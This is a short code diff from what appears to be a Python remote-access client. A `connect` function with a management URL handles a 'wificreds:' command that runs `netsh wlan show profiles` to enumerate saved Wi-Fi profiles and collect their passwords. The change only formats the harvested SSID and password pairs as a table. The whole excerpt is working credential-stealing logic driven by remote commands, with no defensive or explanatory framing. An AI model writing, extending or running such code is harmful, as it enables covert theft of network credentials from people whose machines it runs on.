@@ -184,7 +184,8 @@ def connect(url,managementURL):
 
         elif command.startswith("wificreds:"):
             # Wifi credentials implementation in python https://nitratine.net/blog/post/get-wifi-passwords-with-python/
-            stringBuilder = ""
+            stringBuilder = "\n{:<30}|  {:<}".format("SSID","Pass") + "\n"
+            stringBuilder += "{:<30}|  {:<}".format("----","----") + "\n"
             data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
             profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
             for i in profiles:
